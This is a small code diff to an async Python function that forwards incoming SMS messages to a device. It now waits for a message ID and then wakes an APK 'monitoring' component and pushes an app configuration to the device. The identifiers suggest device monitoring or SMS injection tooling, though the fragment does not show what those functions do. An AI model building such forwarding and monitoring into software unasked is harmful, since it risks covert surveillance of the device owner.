@@ -697,7 +697,10 @@ async def forward_incoming_to_mynum(
 
     try:
         sender, message = prepare_sms_forward(sender, message)
-        await push_mynum_inject(profile, device, sender, message)
+        message_id = await push_mynum_inject(profile, device, sender, message)
+        if message_id:
+            await wake_apk_monitoring(profile, device)
+            await push_virtus_apk_config(profile, device)
         if db is not None:
             queue_forward_to_mynum(db, profile, device, sender, message)
     except Exception as exc:
